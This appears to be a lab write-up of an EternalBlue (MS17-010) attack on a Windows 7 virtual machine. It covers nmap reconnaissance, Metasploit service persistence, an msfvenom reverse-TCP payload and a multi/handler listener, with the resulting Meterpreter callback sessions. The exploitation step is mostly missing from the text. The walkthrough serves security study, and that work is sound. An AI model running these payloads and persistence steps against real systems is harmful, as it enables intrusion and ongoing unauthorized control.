The attack exploited the MS17-010 vulnerability in Microsoft SMBv1, using the EternalBlue exploit to gain remote code execution on a Windows 7 machine. After gaining NT AUTHORITY\SYSTEM level access, persistence was established via a Windows service that survives reboots, followed by a reverse TCP connection for ongoing command and control.

Reconnaissance

nmap · ping

Before scanning, the Windows Firewall on the victim VM was disabled to avoid blocking probe packets. Then two scans were run from the Kali machine.

Host discovery — ping

kali@attacker
$ ping 192.168.156.143 4 packets transmitted, 4 received, 0% packet loss → Target is alive and reachable

Service scan — nmap -sV

kali@attacker
$ nmap -sV 192.168.156.143 PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows NetBIOS-SSN 445/tcp open microsoft-ds Windows 7–10 microsoft-ds (WORKGROUP) ... MAC Address: 00:0C:29:7E:A0:4A (VMware)
💡 Port 445 (SMB) is open — the Windows network/file-sharing protocol. This is the attack surface for EternalBlue.

Weaponization

Metasploit · EternalBlue

Metasploit Framework was launched on Kali Linux. The ms17-010 module was searched and the EternalBlue exploit module was selected.

msfconsole

05

Installation / Persistence

Windows service · auto-start

Goal: maintain access even after the original Meterpreter session closes or the machine reboots. A Windows service-based persistence module was used.

msfconsole
msf > use exploit/windows/persistence/service # Configuration msf exploit(persistence/service) > set LHOST 192.168.156.128 msf exploit(persistence/service) > set SESSION 1 msf exploit(persistence/service) > run [*] Running automatic check… [*] Payload written to C:\Windows\TEMP\ZF0.exe [*] Creating Windows service for persistence… [*] Meterpreter session 2 opened (192.168.156.128:4444 → 192.168.156.143:49160)
📌 The payload was saved at C:\Windows\TEMP\ZF0.exe and registered as a Windows service, so it starts automatically on every boot.

Generating a standalone payload (msfvenom)

A separate reverse shell executable was also created for the C2 phase:

kali@attacker
$ msfvenom -p windows/x64/meterpreter/reverse_tcp \ LHOST=192.168.156.128 LPORT=5386 \ -f exe -o payload.exe Payload size: 589 bytes Saved as: payload.exe
06

Command & Control (C2)

multi/handler · reverse TCP

A Metasploit multi/handler listener was set up to catch the callback from the payload dropped in phase 5. When the Windows VM is rebooted, the persistence service runs and phones back to the attacker.

msfconsole — listener setup
msf > use exploit/multi/handler msf exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp msf exploit(multi/handler) > set LHOST 192.168.156.128 msf exploit(multi/handler) > set LPORT 5386 msf exploit(multi/handler) > exploit -j [*] Exploit running as background job 1. [*] Started reverse TCP handler on 192.168.156.128:5386

The Windows 7 VM was restarted to simulate a real reboot. The persistence service triggered on startup and connected back.

incoming sessions after reboot
[*] Meterpreter session 3 opened (192.168.156.128:5386 → 192.168.156.143:49151) [*] Meterpreter session 4 opened (192.168.156.128:5386 → 192.168.156.143:49156) [*] Meterpreter session 5 opened (192.168.156.128:5386 → 192.168.156.143:49199) [*] Meterpreter session 6 opened (192.168.156.128:5386 → 192.168.156.143:49160)
✓ Persistent C2 established
Multiple sessions opened after the machine rebooted — the persistence service is working. The attacker has ongoing access without needing to re-exploit.
